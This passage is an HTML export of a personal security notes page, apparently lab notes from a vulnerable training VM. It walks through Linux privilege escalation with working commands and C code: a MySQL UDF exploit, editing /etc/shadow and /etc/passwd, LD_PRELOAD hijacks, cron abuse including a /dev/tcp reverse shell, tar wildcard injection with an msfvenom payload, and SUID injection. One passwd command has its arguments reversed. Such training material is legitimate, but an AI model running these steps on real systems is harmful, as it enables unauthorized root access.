@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>index</title>
+	<base href="./">
+	<meta id="root-path" root-path="./">
+	<meta name="viewport"
+		content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
+	<meta charset="UTF-8">
+	<meta name="description" content="v0id's Arsenal - index">
+	<meta property="og:title" content="index">
+	<meta property="og:description" content="v0id's Arsenal - index">
+	<meta property="og:type" content="website">
+	<meta property="og:url" content="index.html">
+	<meta property="og:image" content="sudo-l.png">
+	<meta property="og:site_name" content="v0id's Arsenal">
+	<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml">
+	<script async="" id="webpage-script" src="lib/scripts/webpage.js"
+		onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script>
+	<link rel="icon" href="lib/media/favicon.png">
+	<style>
+		body {
+			--line-width: 40em;
+			--line-width-adaptive: 40em;
+			--file-line-width: 40em;
+			--sidebar-width: min(20em, 80vw);
+			--collapse-arrow-size: 11px;
+			--tree-horizontal-spacing: 0.6em;
+			--tree-vertical-spacing: 0.6em;
+			--sidebar-margin: 12px
+		}
+
+		.sidebar {
+			height: 100%;
+			min-width: calc(var(--sidebar-width) + var(--divider-width-hover));
+			max-width: calc(var(--sidebar-width) + var(--divider-width-hover));
+			font-size: 14px;
+			z-index: 10;
+			position: relative;
+			overflow: hidden;
+			transition: min-width ease-in-out, max-width ease-in-out;
+			transition-duration: .2s;
+			contain: size
+		}
+
+		.sidebar-left {
+			left: 0
+		}
+
+		.sidebar-right {
+			right: 0
+		}
+
+		.sidebar.is-collapsed {
+			min-width: 0;
+			max-width: 0
+		}
+
+		body.floating-sidebars .sidebar {
+			position: absolute
+		}
+
+		.sidebar-content {
+			height: 100%;
+			min-width: calc(var(--sidebar-width) - var(--divider-width-hover));
+			top: 0;
+			padding: var(--sidebar-margin);
+			padding-top: 4em;
+			line-height: var(--line-height-tight);
+			background-color: var(--background-secondary);
+			transition: background-color, border-right, border-left, box-shadow;
+			transition-duration: var(--color-fade-speed);
+			transition-timing-function: ease-in-out;
+			position: absolute;
+			display: flex;
+			flex-direction: column
+		}
+
+		.sidebar:not(.is-collapsed) .sidebar-content {
+			min-width: calc(max(100%, var(--sidebar-width)) - 3px);
+			max-width: calc(max(100%, var(--sidebar-width)) - 3px)
+		}
+
+		.sidebar-left .sidebar-content {
+			left: 0;
+			border-top-right-radius: var(--radius-l);
+			border-bottom-right-radius: var(--radius-l)
+		}
+
+		.sidebar-right .sidebar-content {
+			right: 0;
+			border-top-left-radius: var(--radius-l);
+			border-bottom-left-radius: var(--radius-l)
+		}
+
+		.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty) {
+			display: none
+		}
+
+		.sidebar-topbar {
+			height: 2em;
+			width: var(--sidebar-width);
+			top: var(--sidebar-margin);
+			padding-inline: var(--sidebar-margin);
+			z-index: 1;
+			position: fixed;
+			display: flex;
+			align-items: center;
+			transition: width ease-in-out;
+			transition-duration: inherit
+		}
+
+		.sidebar.is-collapsed .sidebar-topbar {
+			width: calc(2.3em + var(--sidebar-margin) * 2)
+		}
+
+		.sidebar .sidebar-topbar.is-collapsed {
+			width: 0
+		}
+
+		.sidebar-left .sidebar-topbar {
+			left: 0
+		}
+
+		.sidebar-right .sidebar-topbar {
+			right: 0
+		}
+
+		.topbar-content {
+			overflow: hidden;
+			overflow: clip;
+			width: 100%;
+			height: 100%;
+			display: flex;
+			align-items: center;
+			transition: inherit
+		}
+
+		.sidebar.is-collapsed .topbar-content {
+			width: 0;
+			transition: inherit
+		}
+
+		.clickable-icon.sidebar-collapse-icon {
+			background-color: transparent;
+			color: var(--icon-color-focused);
+			padding: 0 !important;
+			margin: 0 !important;
+			height: 100% !important;
+			width: 2.3em !important;
+			margin-inline: 0.14em !important;
+			position: absolute
+		}
+
+		.sidebar-left .clickable-icon.sidebar-collapse-icon {
+			transform: rotateY(180deg);
+			right: var(--sidebar-margin)
+		}
+
+		.sidebar-right .clickable-icon.sidebar-collapse-icon {
+			transform: rotateY(180deg);
+			left: var(--sidebar-margin)
+		}
+
+		.clickable-icon.sidebar-collapse-icon svg.svg-icon {
+			width: 100%;
+			height: 100%
+		}
+
+		.sidebar-section-header {
+			margin: 0 0 1em 0;
+			text-transform: uppercase;
+			letter-spacing: .06em;
+			font-weight: 600
+		}
+
+		body {
+			transition: background-color var(--color-fade-speed) ease-in-out
+		}
+
+		.webpage-container {
+			display: flex;
+			flex-direction: row;
+			height: 100%;
+			width: 100%;
+			align-items: stretch;
+			justify-content: center
+		}
+
+		.document-container {
+			opacity: 1;
+			flex-basis: 100%;
+			max-width: 100%;
+			width: 100%;
+			height: 100%;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			transition: opacity .2s ease-in-out;
+			contain: inline-size
+		}
+
+		.hide {
+			opacity: 0;
+			transition: opacity .2s ease-in-out
+		}
+
+		.document-container>.markdown-preview-view {
+			margin: var(--sidebar-margin);
+			margin-bottom: 0;
+			width: 100%;
+			width: -webkit-fill-available;
+			width: -moz-available;
+			width: fill-available;
+			background-color: var(--background-primary);
+			transition: background-color var(--color-fade-speed) ease-in-out;
+			border-top-right-radius: var(--window-radius, var(--radius-m));
+			border-top-left-radius: var(--window-radius, var(--radius-m));
+			overflow-x: hidden !important;
+			overflow-y: auto !important;
+			display: flex !important;
+			flex-direction: column !important;
+			align-items: center !important;
+			contain: inline-size
+		}
+
+		.document-container>.markdown-preview-view>.markdown-preview-sizer {
+			padding-bottom: 80vh !important;
+			width: 100% !important;
+			max-width: var(--line-width) !important;
+			flex-basis: var(--line-width) !important;
+			transition: background-color var(--color-fade-speed) ease-in-out;
+			contain: inline-size
+		}
+
+		.markdown-rendered img:not([width]),
+		.view-content img:not([width]) {
+			max-width: 100%;
+			outline: 0
+		}
+
+		.document-container>.view-content.embed {
+			display: flex;
+			padding: 1em;
+			height: 100%;
+			width: 100%;
+			align-items: center;
+			justify-content: center
+		}
+
+		.document-container>.view-content.embed>* {
+			max-width: 100%;
+			max-height: 100%;
+			object-fit: contain
+		}
+
+		:has(> :is(.math, table)) {
+			overflow-x: auto !important
+		}
+
+		.document-container>.view-content {
+			overflow-x: auto;
+			contain: content;
+			padding: 0;
+			margin: 0;
+			height: 100%
+		}
+
+		.scroll-highlight {
+			position: absolute;
+			width: 100%;
+			height: 100%;
+			pointer-events: none;
+			z-index: 1000;
+			background-color: hsla(var(--color-accent-hsl), .25);
+			opacity: 0;
+			padding: 1em;
+			inset: 50%;
+			translate: -50% -50%;
+			border-radius: var(--radius-s)
+		}
+	</style>
+	<script
+		defer="">async function loadIncludes() { if ("file:" != location.protocol) { let e = document.querySelectorAll("include"); for (let t = 0; t < e.length; t++) { let o = e[t], l = o.getAttribute("src"); try { const e = await fetch(l); if (!e.ok) { console.log("Could not include file: " + l), o?.remove(); continue } let t = await e.text(), n = document.createRange().createContextualFragment(t), i = Array.from(n.children); for (let e of i) e.classList.add("hide"), e.style.transition = "opacity 0.5s ease-in-out", setTimeout((() => { e.classList.remove("hide") }), 10); o.before(n), o.remove(), console.log("Included file: " + l) } catch (e) { o?.remove(), console.log("Could not include file: " + l, e); continue } } } else { if (document.querySelectorAll("include").length > 0) { var e = document.createElement("div"); e.id = "error", e.textContent = "Web server exports must be hosted on an http / web server to be viewed correctly.", e.style.position = "fixed", e.style.top = "50%", e.style.left = "50%", e.style.transform = "translate(-50%, -50%)", e.style.fontSize = "1.5em", e.style.fontWeight = "bold", e.style.textAlign = "center", document.body.appendChild(e), document.querySelector(".document-container")?.classList.remove("hide") } } } document.addEventListener("DOMContentLoaded", (() => { loadIncludes() })); let isFileProtocol = "file:" == location.protocol; function waitLoadScripts(e, t) { let o = e.map((e => document.getElementById(e + "-script"))), l = 0; !function e() { let n = o[l]; l++, n && "true" != n.getAttribute("loaded") || l < o.length && e(), l < o.length ? n.addEventListener("load", e) : t() }() }</script>
+	<link rel="stylesheet" href="lib/styles/obsidian.css">
+	<link rel="stylesheet" href="lib/styles/theme.css">
+	<link rel="preload" href="lib/styles/global-variable-styles.css" as="style"
+		onload="this.onload=null;this.rel='stylesheet'"><noscript>
+		<link rel="stylesheet" href="lib/styles/global-variable-styles.css">
+	</noscript>
+	<link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+	<noscript>
+		<link rel="stylesheet" href="lib/styles/main-styles.css">
+	</noscript>
+</head>
+
+<body
+	class="publish css-settings-manager theme-light show-inline-title show-ribbon show-urls show-close-buttons show-file-explorer-navigation no-lp-heading-level-indicator">
+	<script
+		defer="">let theme = localStorage.getItem("theme") || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"); "dark" == theme ? (document.body.classList.add("theme-dark"), document.body.classList.remove("theme-light")) : (document.body.classList.add("theme-light"), document.body.classList.remove("theme-dark")), window.innerWidth < 480 ? document.body.classList.add("is-phone") : window.innerWidth < 768 ? document.body.classList.add("is-tablet") : window.innerWidth < 1024 ? document.body.classList.add("is-small-screen") : document.body.classList.add("is-large-screen")</script>
+	<div class="webpage-container workspace">
+		<div class="sidebar-left sidebar">
+			<div class="sidebar-handle"></div>
+			<div class="sidebar-topbar">
+				<div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input
+							class="theme-toggle-input" type="checkbox" id="theme_toggle">
+						<div class="toggle-background"></div>
+					</label></div>
+				<div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%"
+						height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+						stroke-linecap="round" stroke-linejoin="round" class="svg-icon">
+						<path
+							d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z">
+						</path>
+						<path d="M10 4V20"></path>
+						<path d="M4 7H7"></path>
+						<path d="M4 10H7"></path>
+						<path d="M4 13H7"></path>
+					</svg></div>
+			</div>
+			<div class="sidebar-content"></div>
+			<script
+				defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script>
+		</div>
+		<div class="document-container markdown-reading-view hide">
+			<div
+				class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width">
+				<style id="MJX-CHTML-styles"></style>
+				<div class="markdown-preview-sizer markdown-preview-section">
+					<h1 class="page-title heading inline-title" id="index">Linux Privilege Escalation</h1>
+					<div>
+						<p>Here we will discuss various different techniques to escalate to
+							<mark><strong>root</strong></mark> privileges on a <em>Linux Machine</em>. The first and
+							most crucial step would be downloading some popular <em>auto-enumeration</em> scripts on the
+							target machine. Some good options are <strong><a data-tooltip-position="top"
+									aria-label="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener"
+									class="external-link"
+									href="https://github.com/diego-treitos/linux-smart-enumeration"
+									target="_blank">Linux-Smart-Enumeration</a></strong>, <strong><a
+									data-tooltip-position="top" aria-label="https://github.com/rebootuser/LinEnum"
+									rel="noopener" class="external-link" href="https://github.com/rebootuser/LinEnum"
+									target="_blank">LinEnum</a></strong>, <strong><a data-tooltip-position="top"
+									aria-label="https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md"
+									rel="noopener" class="external-link"
+									href="https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md"
+									target="_blank">LinPEAS</a></strong>. These help us identify <em>vulnerable</em>
+							programs and services as well as other potential privileges escalation vectors. Some common
+							methods to escalate privileges are:</p>
+					</div>
+					<div>
+						<ol>
+							<li data-line="0">
+								<p><strong><mark>Service Exploits</mark></strong></p>
+								<p> This involves enumerating various different services running on the target machine
+									and finding any known public exploits for those specific versions!</p>
+								<p> We come across one such service <strong>mysqld</strong>. This <em>MySQL</em> service
+									is running as <strong>root</strong> and the "<mark>root</mark>" user for the service
+									does not have a password assigned. We can use a <a data-tooltip-position="top"
+										aria-label="https://www.exploit-db.com/exploits/1518" rel="noopener"
+										class="external-link" href="https://www.exploit-db.com/exploits/1518"
+										target="_blank">popular exploit</a> that takes advantage of <em>User Defined
+										Functions</em> (<strong>UDFs</strong>) to run system commands as <em>root</em>
+									via the MySQL service. In this exploit we basically compile the source code into a
+									<em>shared object</em> file. Then we start the <em>msql</em> service as
+									<em>root</em> without any password. Now, we create a table and insert the absolute
+									file path of shared object as a value in the table. After that we create a custom
+									defined function to copy <code>/bin/bash</code> to <code>/tmp/rootbash</code> and
+									set the SUID permission. Executing this <em>rootbash</em> gives us a root shell. The
+									commands are as follows:</p>
+								<p> <code>gcc -g -c raptor_udf2.c -fPIC</code><br>
+									<code>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</code>
+								</p>
+								<p> <code>mysql -u root</code></p>
+								<p> <code>use mysql;</code><br>
+									<code>create table foo(line blob);</code><br>
+									<code>insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));</code><br>
+									<code>select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';</code><br>
+									<code>create function do_system returns integer soname 'raptor_udf2.so';</code>
+								</p>
+								<p> <code>select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');</code>
+								</p>
+								<p> <code>/tmp/rootbash -p</code></p>
+							</li>
+							<li data-line="21">
+								<p><mark><strong>Weak File Permissions - Readable /etc/shadow</strong></mark></p>
+								<p> This section involves identifying files with <em>critical</em> information that have
+									<em>poor</em> file permissions attached to them. This way we can read the contents
+									of the file and if lucky, even write to it. </p>
+								<p> We find that both <code>/etc/shadow</code> as well <code>/etc/passwd</code> files
+									have global <strong>read&amp;write</strong> permissions. Now, by extracting the
+									password hashes of the <em>root</em> account from <em>shadow</em> file one can try
+									cracking it using <mark>johntheripper</mark> or <mark>hashcat</mark> with a popular
+									wordlist.</p>
+								<p> <code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></p>
+							</li>
+							<li data-line="29">
+								<p><strong><mark>Weak File Permissions - Writable /etc/shadow</mark></strong></p>
+								<p> If we have the <strong>write</strong> permissions over the <code>/etc/shadow</code>
+									file we can simply <em>replace</em> the original password hash with our own hash.
+									This way we can indirectly set the root password according to our own liking. We can
+									generate our own password hash using the command:</p>
+								<p> <code>mkpasswd -m sha-512 &lt;newpasswordhere&gt;</code></p>
+							</li>
+							<li data-line="35">
+								<p><strong><mark>Weak File Permissions - Writable /etc/passwd</mark></strong></p>
+								<p> Now, suppose if the <code>/etc/shadow</code> file is <em>inaccessible</em>, in that
+									case we can also modify the <code>/etc/passwd</code> file to get
+									<strong>root</strong>. </p>
+								<p> First generate a new <em>password hash</em>. Then copy the <em>root user's row</em>
+									and append it to the <em>bottom</em> of the file, changing the first instance of the
+									word "<mark>root</mark>" to "<mark>newroot</mark>" and placing the generated
+									password hash&nbsp;between the first and second colon (replacing the "<em>x</em>").
+									This way we created a new user with root privileges which uses our own password.</p>
+								<p> <code>openssl passwd &lt;newpasswordhere&gt;</code><br>
+									<code>echo /etc/passwd &gt;&gt; newroot:&lt;passwordhash&gt;:0:0:root:/root:/bin/bash</code><br>
+									<code>su newroot</code>
+								</p>
+							</li>
+							<li data-line="45">
+								<p><strong><mark>Sudo - Shell Escape Sequences</mark></strong></p>
+								<p> First list all those programs that can be run using <strong>sudo</strong> using
+									<code>sudo -l</code>.<br>
+									We come across programs that can run as <em>sudo</em> and that too without a
+									password.<br>
+									<span alt="sudo-l.png" src="sudo-l.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="sudo-l.png"
+											src="sudo-l.png"></span><br>
+									Visit <strong><a data-tooltip-position="top"
+											aria-label="%5Bhttps://gtfobins.github.io%5D(https://gtfobins.github.io)"
+											rel="noopener" class="external-link"
+											href="%5Bhttps://gtfobins.github.io%5D(https://gtfobins.github.io)"
+											target="_blank">GTFOBins</a></strong> and search for some of the program
+									names. If the program is listed with "<mark>sudo</mark>" as a function, you can use
+									it to elevate privileges, usually via an escape sequence.
+								</p>
+								<p> Choose a program from the list and try to gain a root shell, using the instructions
+									from <em>GTFOBins</em>.</p>
+							</li>
+							<li data-line="54">
+								<p><strong><mark>Sudo - Environment Variables</mark></strong></p>
+								<p> <em>Sudo</em> can be configured to inherit certain environment variables from the
+									user's environment. Check which environment variables are inherited (look for the
+									<em>env_keep</em> options):</p>
+								<p> <code>sudo -l</code></p>
+								<p> <strong>LD_PRELOAD</strong> and <strong>LD_LIBRARY_PATH</strong> are both inherited
+									from the user's environment.&nbsp;<em>LD_PRELOAD</em> loads a shared object before
+									any others when a program is run. <em>LD_LIBRARY_PATH</em> provides a list of
+									directories where shared libraries are searched for first.</p>
+								<p> Create a shared object using by compiling the following <em>C code</em>:<br>
+									<code>#include &lt;stdio.h&gt;</code><br>
+									<code>#include &lt;sys/types.h&gt;</code><br>
+									<code>#include &lt;stdlib.h&gt;</code>
+								</p>
+								<p> <code>void _init() {</code><br>
+									<code>unsetenv("LD_PRELOAD");</code><br>
+									<code>setresuid(0,0,0);</code><br>
+									<code>system("/bin/bash -p");</code><br>
+									<code>}</code>
+								</p>
+								<p> <code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so&nbsp;./preload.c</code></p>
+								<p> Run one of the programs you are allowed to run via <em>sudo</em> (listed when
+									running <strong>sudo -l</strong>), while setting the <em>LD_PRELOAD</em> environment
+									variable to the full path of the new shared object:</p>
+								<p> <code>sudo LD_PRELOAD=/tmp/preload.so program-name-here</code></p>
+								<p> A <em>root shell</em> should spawn. Exit out of the shell before continuing.
+									Depending on the program you chose, you may need to exit out of this as well.</p>
+								<p> Run <strong>ldd</strong> against the <em>apache2</em> program file to see which
+									shared libraries are used by the program:</p>
+								<p> <code>ldd /usr/sbin/apache2</code><br>
+									<span alt="ld_shared.png" src="ld_shared.png"
+										class="internal-embed media-embed image-embed is-loaded"><img
+											alt="ld_shared.png" src="ld_shared.png"></span><br>
+									Create a shared object with the same name as any one of the listed libraries
+									(<strong>libcrypt.so.1</strong>) using the following code:
+								</p>
+								<p> <code>#include &lt;stdio.h&gt;</code><br>
+									<code>#include &lt;stdlib.h&gt;</code>
+								</p>
+								<p> <code>static void hijack() __attribute__((constructor));</code></p>
+								<p> <code>void hijack() {</code><br>
+									<code>unsetenv("LD_LIBRARY_PATH");</code><br>
+									<code>setresuid(0,0,0);</code><br>
+									<code>system("/bin/bash -p");</code><br>
+									<code>}</code>
+								</p>
+								<p> <code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC ./library_path.c</code></p>
+								<p> Run <em>apache2</em> using sudo, while settings the <em>LD_LIBRARY_PATH</em>
+									environment variable to <code>/tmp</code> (where we output the compiled shared
+									object):</p>
+								<p> <code>sudo LD_LIBRARY_PATH=/tmp apache2</code></p>
+								<p> A <em>root shell</em> should spawn.</p>
+							</li>
+							<li data-line="106">
+								<p><mark><strong>Cron Jobs - File Permissions</strong></mark></p>
+								<p> <strong>Cron jobs</strong> are programs or scripts which users can <em>schedule</em>
+									to run at specific times or intervals.&nbsp;<strong>Cron table</strong> files
+									(<em>crontabs</em>) store the configuration for cron jobs.&nbsp;The system-wide
+									crontab is located at <code>/etc/crontab</code>. View the contents of the
+									system-wide crontab:</p>
+								<p> <code>cat /etc/crontab</code><br>
+									<span alt="crontab.png" src="crontab.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="crontab.png"
+											src="crontab.png"></span><br>
+									There should be two <em>cron jobs</em> scheduled to run every minute. One
+									runs&nbsp;<code>overwrite.sh</code>, the other
+									runs&nbsp;<code>/usr/local/bin/compress.sh</code>.
+								</p>
+								<p> Locate the full path of the <em>overwrite.sh</em> file:<br>
+									<code>locate overwrite.sh</code><br>
+									Note that the file is <em>world-writable</em>:<br>
+									<code>ls -l /usr/local/bin/overwrite.sh</code><br>
+									Append the following code to the&nbsp;overwrite.sh&nbsp;file:<br>
+									<code>bash -i &gt;&amp; /dev/tcp/192.168.75.131/4444 0&gt;&amp;1</code>
+								</p>
+								<p> Thus when the scheduled overwrite.sh script gets executed it will generate a
+									<em>reverse shell</em> back to the our local machine which can be caught using
+									<em>netcat listener</em>.</p>
+							</li>
+							<li data-line="123">
+								<p><mark><strong>Cron Jobs - PATH Environment Variable</strong></mark></p>
+								<p> Now what if the cronjob file is not <strong>user writable</strong>? </p>
+								<p> If the cronjob doesn't have an <em>absolute path</em> set inside the crontab, then
+									it will search the directories listed inside the <code>$PATH</code> variable for
+									that particular file. We can create our own version of the <em>cronjob
+										executable</em> and place it inside any one of the user writable directories
+									that comes before the actual directory that stores the real cronjob file. This way
+									our file will be executed instead of the actual file.</p>
+								<p> View the contents of the <em>system-wide</em> crontab:<br>
+									<code>cat /etc/crontab</code><br>
+									Note that the <em>PATH</em> variable starts with&nbsp;<strong>/home/user</strong>
+									which is our user's home directory. Create a file called
+									<strong>overwrite.sh</strong> in your home directory with the following contents:
+								</p>
+								<p> <code>#!/bin/bash</code><br>
+									<code>cp /bin/bash /tmp/rootbash</code><br>
+									<code>chmod +xs /tmp/rootbash</code>
+								</p>
+								<p> Make sure that the file is executable:<br>
+									<code>chmod +x /home/user/overwrite.sh</code>
+								</p>
+								<p> Wait for the <em>cron job</em> to run (should not take longer than a
+									minute).&nbsp;Run the <code>/tmp/rootbash</code> command with <strong>-p</strong> to
+									gain a shell running with root privileges:</p>
+								<p> <code>/tmp/rootbash -p</code></p>
+							</li>
+							<li data-line="144">
+								<p><mark><strong>Cron Jobs - Wildcards</strong></mark></p>
+								<p> Now, what if the cronjob has an <strong>absolute path</strong> set?</p>
+								<p> If the <em>cronjob</em> file to be executed uses a <strong>Wildcard
+										character</strong> (<code>*</code>), we could exploit that to execute
+									<em>user-defined</em> files. Linux is quite flexible with filenames, so we can even
+									use <code>-xyz</code> as a filename. When this file will be called upon by the
+									cronjob, it would rather be passed a <em>argument</em> instead of a filename.</p>
+								<p> View the contents of the other <em>cronjob</em> script:<br>
+									<code>cat /usr/local/bin/compress.sh</code><br>
+									<span alt="wildcard.png" src="wildcard.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="wildcard.png"
+											src="wildcard.png"></span><br>
+									Note that the <strong>tar</strong> command is being run with a wildcard
+									(<code>*</code>) in your home directory. Take a look at the
+									<strong>GTFOBins</strong> page for <strong><a data-tooltip-position="top"
+											aria-label="https://gtfobins.github.io/gtfobins/tar/" rel="noopener"
+											class="external-link" href="https://gtfobins.github.io/gtfobins/tar/"
+											target="_blank">tar</a></strong>. Note that <em>tar</em> has command line
+									options that let you run other commands as part of a <em>checkpoint</em>
+									feature.<br>
+									<span alt="tar.png" src="tar.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="tar.png"
+											src="tar.png"></span><br>
+									Use <strong>msfvenom</strong> on your Kali box to generate a reverse shell ELF
+									binary.<br>
+									<code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.75.131 LPORT=4444 -f elf -o shell.elf</code>
+								</p>
+								<p> Transfer the <code>shell.elf</code> file to <code>/home/user/</code> on the
+									<em>Debian VM</em>. Make sure the file is executable:<br>
+									<code>chmod +x /home/user/shell.elf</code>
+								</p>
+								<p> Create these two files in <code>/home/user</code>:<br>
+									<code>touch /home/user/--checkpoint=1</code><br>
+									<code>touch /home/user/--checkpoint-action=exec=shell.elf</code>
+								</p>
+								<p> When the <mark>tar</mark> command in the cronjob runs, the wildcard (<code>*</code>)
+									will expand to include these files. Since their filenames are <em>valid tar
+										command</em> line options, tar will recognize them as such and treat them as
+									command line options rather than filenames.</p>
+								<p> Set up a <strong>netcat</strong> listener on your Kali box on port <em>4444</em> and
+									wait for the cronjob to run (should not take longer than a minute). A <em>root
+										shell</em> should connect back to your <em>netcat</em> listener.</p>
+							</li>
+							<li data-line="169">
+								<p><mark><strong>SUID / SGID Executables - Known Exploits</strong></mark></p>
+								<p> Find all the <strong>SUID/SGID</strong> executables on the <em>Debian VM</em>. This
+									can either be achieved through the awesome <em>Linux enumeration scripts</em> or by
+									using the command:<br>
+									<code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code>
+								</p>
+								<p> Note that&nbsp;<code>/usr/sbin/exim-4.84-3</code> appears in the results. Try to
+									find a known exploit for this version of <strong>exim</strong> as it quite infamous
+									for security vulnerabilities.&nbsp;<a data-tooltip-position="top"
+										aria-label="https://www.exploit-db.com/" rel="noopener" class="external-link"
+										href="https://www.exploit-db.com/" target="_blank">Exploit-DB</a>,&nbsp;Google,
+									and GitHub are good places to search!</p>
+								<p> A <em>local privilege escalation</em> exploit matching this version of <em>exim</em>
+									exactly should be available. A copy can be found on the Debian VM
+									at&nbsp;<code>/home/user/tools/suid/exim/cve-2016-1531.sh</code></p>
+								<p> Run the exploit script to gain a root shell:<br>
+									<code>/home/user/tools/suid/exim/cve-2016-1531.sh</code>
+								</p>
+								<p> <mark>Note: Sometimes some scripts might pop a
+										<code>/bin/sh^M: bad interpreter: No such file or directory</code> error. This
+										means the script was written using a <strong>Windows newline character</strong>.
+										These characters can be simply removed using the command:
+										<code>sed -i -e "s/^M//" script.sh</code>.</mark></p>
+							</li>
+							<li data-line="183">
+								<p><strong><mark>SUID / SGID Executables - Shared Object Injection</mark></strong></p>
+								<p> When a program is executed it loads the necessary <strong>shared objects</strong>.
+									We can track these <em>system calls</em> for any shared objects using a program
+									called <strong><mark>strace</mark></strong>. We can then check whether any shared
+									objects were not found and if so, we could possibly inject our own
+									<em>malicious</em> shared objects by writing them to the file location. </p>
+								<p> On this machine, the&nbsp;<code>/usr/local/bin/suid-so</code> <em>SUID
+										executable</em> is deliberately made vulnerable to shared object injection.
+									First, execute the file and note that currently it displays a progress bar before
+									exiting:<br>
+									<code>/usr/local/bin/suid-so</code>
+								</p>
+								<p> Run <strong>strace</strong> on the file and search the output for <em>open/access
+										calls</em> and for "<em>no such file</em>" errors:<br>
+									<code>strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such file"</code><br>
+									<span alt="so 2.png" src="so 2.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="so 2.png"
+											src="so-2.png"></span><br>
+									Note that the executable tries to load the
+									<code>/home/user/.config/libcalc.so</code> <em>shared object</em> within our home
+									directory, but it cannot be found. Also, the particular directory is writable by the
+									user.
+								</p>
+								<p> Create the <strong>.config</strong> directory for the libcalc.so file:<br>
+									<code>mkdir /home/user/.config</code><br>
+									Compile a <em>C</em> code that spawns a Bash shell and move it at the location the
+									<strong>suid-so</strong> executable was looking for it:
+								</p>
+								<p> <code>#include &lt;stdio.h&gt;</code><br>
+									<code>#include &lt;stdlib.h&gt;</code>
+								</p>
+								<p> <code>static void inject() __attribute__((constructor));</code></p>
+								<p> <code>void inject() {</code><br>
+									<code>setuid(0);</code><br>
+									<code>system("/bin/bash -p");</code><br>
+									<code>}</code>
+								</p>
+								<p> <code>gcc -shared -fPIC -o /home/user/.config/libcalc.so&nbsp;./libcalc.c</code></p>
+								<p> Execute the <strong>suid-so</strong> executable again, and note that this time,
+									instead of a progress bar, we get a root shell.<br>
+									<code>/usr/local/bin/suid-so</code>
+								</p>
+							</li>
+							<li data-line="214">
+								<p><mark><strong>SUID / SGID Executables - Environment Variables</strong></mark></p>
+								<p> If a program tries to execute another program, the name of that program is likely
+									<em>embedded</em> in the executable file as a <em>string</em>. We can run
+									<strong>strings</strong> on the executable file to find the strings of characters.
+									We can also use <strong>strace</strong> to see how that program is executing.
+									Another program called <strong>ltrace</strong> may also be of use.<br>
+									<span alt="strace.png" src="strace.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="strace.png"
+											src="strace.png"></span><br>
+									The <code>/usr/local/bin/suid-env</code> <em>executable</em> can be exploited due to
+									it inheriting the user's <strong>PATH</strong> environment variable and attempting
+									to execute programs without specifying an absolute path.
+								</p>
+								<p> First, execute the file and note that it seems to be trying to start the apache2
+									webserver:<br>
+									<code>/usr/local/bin/suid-env</code>
+								</p>
+								<p> Run strings on the file to look for strings of printable characters:<br>
+									<code>strings /usr/local/bin/suid-env</code><br>
+									<span alt="path.png" src="path.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="path.png"
+											src="path.png"></span><br>
+									One line ("<code>service apache2 start</code>") suggests that the service executable
+									is being called to start the webserver, however the <em>full path</em> of the
+									executable (<code>/usr/sbin/service</code>) is not being used. Compile the following
+									code into an executable called <strong>service</strong>. This code simply spawns a
+									shell:
+								</p>
+								<p> <code>int main() {</code><br>
+									<code>setuid(0);</code><br>
+									<code>system("/bin/bash -p");</code><br>
+									<code>}</code>
+								</p>
+								<p> <code>gcc -o service ./service.c</code></p>
+								<p> Prepend the <em>current directory</em> (or where the new service executable is
+									located) to the <strong>PATH</strong> variable, and run
+									the&nbsp;<em>suid-env</em>&nbsp;executable to gain a root shell:<br>
+									<code>PATH=/home/user:$PATH </code>
+								</p>
+								<p> <code>/usr/local/bin/suid-env</code></p>
+							</li>
+							<li data-line="240">
+								<p><mark><strong>SUID / SGID Executables - Abusing Shell Features (#1)</strong></mark>
+								</p>
+								<p> The&nbsp;<code>/usr/local/bin/suid-env2</code>&nbsp;executable is identical
+									to&nbsp;<code>/usr/local/bin/suid-env</code>&nbsp;except that it&nbsp;uses the
+									<em>absolute path</em> of the <strong>service</strong> executable
+									(<code>/usr/sbin/service</code>) to start the apache2 webserver.</p>
+								<p> Verify this with strings:<br>
+									<code>strings /usr/local/bin/suid-env2</code><br>
+									<span alt="env2.png" src="env2.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="env2.png"
